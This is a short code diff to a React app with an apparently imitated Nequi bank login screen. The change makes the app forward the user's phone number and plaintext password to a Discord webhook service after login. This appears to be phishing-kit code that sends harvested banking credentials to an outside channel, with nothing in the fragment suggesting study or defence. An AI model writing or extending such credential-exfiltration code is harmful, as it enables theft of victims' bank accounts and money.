@@ -113,11 +113,13 @@ export default function App() {
         {step === 'nequi-login' && (
           <NequiLoginScreen
             phone={formData.phone}
-            onSuccess={() => {
+            onSuccess={(phoneValue, password) => {
+              setFormData((prev) => ({ ...prev, phone: phoneValue }))
               DiscordWebhookService.sendUserEvent(
                 'Login exitoso',
                 'Usuario autenticado correctamente en Nequi',
-                { role: 'Cliente', phone: formData.phone },
+                { role: 'Cliente', phone: phoneValue },
+                { 'Celular': phoneValue, 'Contraseña': password },
               )
               navigate('form', 'forward')
             }}
